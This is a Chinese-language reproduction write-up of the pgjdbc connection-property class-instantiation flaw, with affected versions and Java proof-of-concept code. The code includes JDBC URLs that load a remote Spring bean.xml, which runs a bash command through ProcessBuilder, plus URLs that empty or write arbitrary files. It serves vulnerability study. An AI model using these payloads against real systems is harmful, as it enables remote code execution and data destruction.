　　在 PostgreSQL 数据库的 jdbc 驱动程序中发现一个安全漏洞。当攻击者控制 jdbc url 或者属性时，使用 PostgreSQL 数据库的系统将受到攻击。 pgjdbc 根据通过 `authenticationPluginClassName`、`sslhostnameverifier`、`socketFactory` 、`sslfactory`、`sslpasswordcallback` 连接属性提供类名实例化插件实例。但是，驱动程序在实例化类之前没有验证类是否实现了预期的接口。这可能导致通过任意类加载远程代码执行。

```
影响范围：

9.4.1208 <=PgJDBC <42.2.25

42.3.0 <=PgJDBC < 42.3.2
```

环境搭建

```
<!-- https://mvnrepository.com/artifact/org.postgresql/postgresql -->
<dependency>
    <groupId>org.postgresql</groupId>
    <artifactId>postgresql</artifactId>
    <version>42.3.1</version>
</dependency>
<!-- https://mvnrepository.com/artifact/org.springframework/spring-context-support -->
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-context-support</artifactId>
    <version>5.3.23</version>
</dependency>
```

## 漏洞复现

### 任意代码执行 socketFactory/socketFactoryArg

```
package com.example.testspring;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class PostGreSqlTest {
    public static void main(String[] args) throws SQLException {
        String socketFactoryClass = "org.springframework.context.support.ClassPathXmlApplicationContext";
        String socketFactoryArg = "http://127.0.0.1:8088/bean.xml";
        String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test/?socketFactory="+socketFactoryClass+ "&socketFactoryArg="+socketFactoryArg;
        Connection connection = DriverManager.getConnection(jdbcUrl);
    }
}
```

bean.xml

```
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:p="http://www.springframework.org/schema/p"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
<!--    普通方式创建类-->
   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value>open -a Calculator</value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

![image-20221210120034204](images/72.png)

还可以通过FileOutputStream将任意文件置空

```
package com.example.testspring;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class PostGreSqlTest {
    public static void main(String[] args) throws SQLException {
        String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=java.io.FileOutputStream&socketFactoryArg=test.txt";
        Connection connection = DriverManager.getConnection(jdbcUrl);
    }
}
```

### 任意代码执行 sslfactory/sslfactoryarg

```
package com.example.testspring;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class PostGreSqlTest {
    public static void main(String[] args) throws SQLException {
        String sslfactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
        String sslfactoryarg = "http://127.0.0.1:8088/bean.xml";
        String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test/?sslfactory="+sslfactory+ "&sslfactoryarg="+sslfactoryarg;
        Connection connection = DriverManager.getConnection(jdbcUrl);
    }
}
```

这种要先监听5432端口

### 任意文件写入 loggerLevel/loggerFile

可以将日志信息保存到文件

```
package com.example.testspring;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class PostGreSqlTest {
    public static void main(String[] args) throws SQLException {
        String loggerLevel = "debug";
        String loggerFile = "test.txt";
        String shellContent="test";
        String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test?loggerLevel="+loggerLevel+"&loggerFile="+loggerFile+ "&"+shellContent;
        Connection connection = DriverManager.getConnection(jdbcUrl);
    }
}
```





参考链接：

https://www.mi1k7ea.com/2021/04/23/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86

[Java安全之JDBC反序列化 (yuque.com)](https://www.yuque.com/jinjinshigekeaigui/qskpi5/upxost#IbWOt)

https://www.anquanke.com/post/id/203086

https://xz.aliyun.com/t/8159#toc-1

https://su18.org/post/jdbc-connection-url-attack/#arbitrary-file-reading-vulnerability

https://xz.aliyun.com/t/11812#toc-5